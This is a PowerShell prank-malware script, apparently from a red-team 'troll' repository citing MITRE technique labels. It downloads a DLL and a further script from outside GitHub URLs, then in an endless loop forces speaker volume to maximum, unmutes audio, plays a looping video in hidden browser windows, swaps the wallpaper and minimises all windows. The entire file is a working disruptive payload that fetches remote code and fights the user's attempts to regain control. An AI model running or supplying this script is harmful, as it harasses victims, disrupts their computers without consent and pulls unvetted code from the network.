#wait till activity
#Setup web settings for environment
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
#Fetch Audio CMDlet
$path = $env:APPDATA + "AudioDeviceCmdlets.dll"
Invoke-WebRequest -Uri "https://github.com/frgnca/AudioDeviceCmdlets/releases/download/v3.0/AudioDeviceCmdlets.dll" -Outfile $path
Import-Module $path
Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}
Function Set-WallPaper($Value)
{
 Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value $value
 rundll32.exe user32.dll, UpdatePerUserSystemParameters
 rundll32.exe user32.dll, UpdatePerUserSystemParameters
}
#Persistence: Scheduled Task - T1053
$dst = $env:LOCALAPPDATA + "LocalReader.ps1"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/b4549968/Powertr0ll/master/LocalReader.ps1" -Outfile $dst
#Download Images
$client = new-object System.Net.WebClient
$dst = $env:LOCALAPPDATA + "whistle.bmp"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/b4549968/Powertr0ll/master/Whistle.bmp" -Outfile $dst
$dst = $env:LOCALAPPDATA + "1.bmp"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/b4549968/Powertr0ll/master/1.bmp" -Outfile $dst
$dst = $env:LOCALAPPDATA + "2.bmp"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/b4549968/Powertr0ll/master/2.bmp" -Outfile $dst
$dst = $env:LOCALAPPDATA + "3.bmp"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/b4549968/Powertr0ll/master/3.bmp" -Outfile $dst
$dst = $env:LOCALAPPDATA + "4.bmp"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/b4549968/Powertr0ll/master/4.bmp" -Outfile $dst
$dst = $env:LOCALAPPDATA + "5.bmp"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/b4549968/Powertr0ll/master/5.bmp" -Outfile $dst
$dst = $env:LOCALAPPDATA + "6.bmp"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/b4549968/Powertr0ll/master/6.bmp" -Outfile $dst
$dst = $env:LOCALAPPDATA + "whistle.bmp"
Set-WallPaper -value $dst
#Start-Sleep -Milliseconds 120000;
Set-Speaker -Volume 100;
$navOpenInBackgroundTab = 0x1000;
Set-AudioDevice -Index 1
$ie = new-object -com InternetExplorer.Application
$ie.Navigate2("http://www.infinitelooper.com/?v=yBLdQ1a4-JI&p=n");
$ie.Visible = $false;
Start-Sleep -Milliseconds 2000
$shell = New-Object -ComObject "Shell.Application"
$shell.MinimizeAll()
Start-Sleep -Milliseconds 30000;
Set-AudioDevice -PlaybackVolume 100
$ie2 = new-object -com InternetExplorer.Application
$ie2.Navigate2("http://www.infinitelooper.com/?v=yBLdQ1a4-JI&p=n");
$ie2.Visible = $false;
Start-Sleep -Milliseconds 15000;
Set-AudioDevice -PlaybackVolume 100
$ie3 = new-object -com InternetExplorer.Application
$ie3.Navigate2("http://www.infinitelooper.com/?v=yBLdQ1a4-JI&p=n");
$ie3.Visible = $false;
#Engage Impact
while($true)
{
    ##Random Sleep
    $sleeptime = Get-Random -Minimum 1000 -Maximum 5000
    Start-Sleep -Milliseconds $sleeptime
    $volume = Get-AudioDevice -PlaybackVolume
    $mute = Get-AudioDevice -PlaybackMute
    if (($volume -ne "100%") -or ($mute -eq "True")){
        Set-AudioDevice -PlaybackMute 0
        Set-AudioDevice -PlaybackVolume 100
    }
    #Set Random Wallpaper based on number 1 - 6 randomiser
    $num = Get-Random -Minimum 1 -Maximum 6
    $dst = $env:LOCALAPPDATA + $num + ".bmp"
    Set-WallPaper -value $dst
    $shell = New-Object -ComObject "Shell.Application"
    $shell.MinimizeAll()
}
